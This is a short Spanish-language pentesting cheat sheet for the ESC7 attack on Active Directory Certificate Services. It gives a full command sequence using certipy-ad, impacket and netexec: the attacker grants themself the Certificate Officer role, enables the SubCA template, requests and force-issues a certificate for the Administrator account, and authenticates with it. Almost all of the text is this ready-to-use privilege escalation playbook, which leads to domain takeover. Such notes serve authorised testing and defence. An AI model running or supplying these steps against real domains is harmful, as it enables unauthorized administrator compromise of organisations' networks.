ESC7 se centra en permisos peligrosos sobre la CA o sus roles, como ManageCA o ManageCertificates.

Dangerous Permissions on CA

ESC7 PoC

Agregar el rol Certificate Officer al propio usuario

certipy-ad ca -u <user>@<dominio> -p <pass> -ns <ip_target> -target <hostname.dominio> -ca <ca_name> -add-officer <user>

Habilitar plantilla SubCA

certipy-ad ca -u <user>@<dominio> -p <pass> -ns <ip_target> -target <hostname.dominio> -ca <ca_name> -enable-template 'SubCA'

Kali: Enumerar SID del dominio

# Impacket
impacket-lookupsid <user>:<pass>@<ip_dc> | grep "Domain SID"
# Netexec
nxc ldap <ip_dc> -u <user> -p <pass> --get-sid

Solicitar certificado para Administrator, si falla se crea una .key con un id

certipy-ad req -u <user>@<dominio> -p <pass> -dc-ip <ip_target> -target <hostname.dominio> -ca <ca_name> -template 'SubCA' -upn administrator@<dominio> -sid <domain_sid>
 # Guardar Request ID como <id>.key

Aprobar la solicitud anterior a través de la <id>.key

certipy-ad ca -u <user>@<dominio> -p <pass> -ns <ip_target> -target <hostname.dominio> -ca <ca_name> -issue-request <id>
# ID del paso 3

Recuperar el certificado de Administrator

certipy-ad req -u <user>@<dominio> -p <pass> -dc-ip <ip_target> -target <hostname.dominio> -ca <ca_name> -retrieve <id>

Autenticarse con el Certificado .pfx

certipy-ad auth -pfx administrator.pfx -domain <domain.local> -dc-ip <dc_ip>
